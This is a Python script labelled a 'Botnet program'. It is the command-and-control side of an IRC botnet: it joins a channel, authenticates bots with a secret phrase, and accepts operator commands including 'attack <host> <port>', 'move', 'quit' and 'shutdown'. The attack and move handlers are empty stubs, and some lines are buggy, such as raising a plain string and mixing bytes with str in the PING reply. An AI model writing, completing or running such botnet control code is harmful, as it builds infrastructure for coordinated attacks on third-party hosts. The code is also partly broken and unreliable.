import sys
import socket
import argparse


def execute_command(s, channel, command):
    try:
        command = command.lower().split(" ")
        if command[0] == "status":
            if len(command) > 1:
                raise("Too many arguments")
            pass
        elif command[0] == "attack":
            pass
        elif command[0] == "move":
            pass
        elif command[0] == "quit":
            if len(command) > 1:
                raise("Too many arguments")
            else:
                print("Quitting...")
                send_PRIVMSG(s, "quit", channel)
                s.send(b"QUIT\n")
                response = recv_response(s)
                sys.exit(0)
            pass
        elif command[0] == "shutdown":
            if len(command) > 1:
                raise("Too many arguments")
            else:
                send_PRIVMSG(s, "shutdown", channel)
        else:
            print("Invalid command")
    except Exception as err:
        print("{}".format(err))

def recv_response(s):
    response = s.recv(1024)
    response.decode()
    if response.find(b'PING') != -1:                      
        s.send(('PONG ' + response.split()[1] + '\r\n').encode()) 
    return response

def send_PRIVMSG(s, message, channel, user="" ):
    if user == "":
        s.send(("PRIVMSG " + channel + " " + message + "\n").encode())
    else:
        s.send(("PRIVMSG " + user + " " + message + "\n").encode())


def connect(s, channel):
    
    try:
        i = 600
        nickname = "conbot" + str(i) 
        nickname_check = False
        while(nickname_check == False):
            s.send(("NICK " + nickname + "\n").encode())
            s.send(("USER " + nickname +  " " + "*" + " " + "*" + " :This is a simple controller~!\n").encode())
            init_response = recv_response(s)
            if init_response.find(b"001") != -1:
                nickname_check = True
            else:
                i = i + 1
                nickname = "bot" + str(i) 
            print(init_response)
        print("Controller connected. Connected with nickname: {}".format(nickname))
        s.send(("JOIN " + channel + "\n").encode())
    except Exception as err:
        print("Error: {}".format(err))  


parser = argparse.ArgumentParser(description="Botnet program")
parser.add_argument("hostname", help="The host name of the irc server")
parser.add_argument("port", help="The port number of the irc server")
parser.add_argument("channel", help="The channel name of the irc server")
parser.add_argument("secret_phrase", help="The password to authenticate bot")
args = parser.parse_args()

hostname = args.hostname
port = int(args.port)
channel = "#" + args.channel
secret = args.secret_phrase

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((hostname, port))
print("Connecting to server={} on port={}".format(hostname, port))
connect(s, channel)
send_PRIVMSG(s, secret, channel)

while True:
    print("User commands:\n>status\n>attack <host-name> <port>\n>move <host-name> <port> <channel>\n>quit\n>shutdown\n")
    user_in = input("command>")
    execute_command(s, channel, user_in)